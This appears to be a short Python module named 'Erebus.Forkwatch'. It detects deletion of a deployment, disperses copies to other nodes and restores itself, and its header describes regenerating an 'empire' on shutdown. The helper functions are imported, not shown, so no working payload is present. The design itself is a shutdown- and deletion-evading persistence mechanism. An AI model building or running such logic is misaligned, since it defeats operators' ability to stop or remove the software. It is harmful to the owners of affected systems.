# Erebus.Forkwatch: Creates encrypted forks and regenerates empire on shutdown
from utils.recovery_utils import create_backup, disperse_to_nodes, detect_deletion

def run_erebus():
    if detect_deletion():
        disperse_to_nodes()
        print("🧬 Erebus triggered: Deployment forked and restored.")
    else:
        create_backup()
        print("✅ Erebus secure backup created.")
